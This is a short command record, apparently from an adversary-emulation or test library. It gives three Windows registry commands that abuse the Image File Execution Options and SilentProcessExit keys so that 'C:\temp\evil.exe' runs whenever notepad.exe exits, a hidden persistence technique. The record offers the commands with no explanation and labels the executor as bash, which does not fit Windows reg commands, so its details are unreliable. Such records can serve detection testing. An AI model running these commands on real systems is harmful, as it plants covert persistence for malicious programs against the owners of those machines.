---
id: 04fbfa25-ca59-41e0-9799-34f2e5c296d6
name: Add registry keys for notepad.exe
type: command
executor: bash
data: 'reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution
  Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512

  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"
  /v ReportingMode /t REG_DWORD /d 1

  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe"
  /v MonitorProcess /d "C:\temp\evil.exe"'
output: null
created_at: '2023-04-06T03:56:28.047726+00:00'
updated_at: '2023-04-10T20:37:22.880081+00:00'
---

# Add registry keys for notepad.exe

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"
```


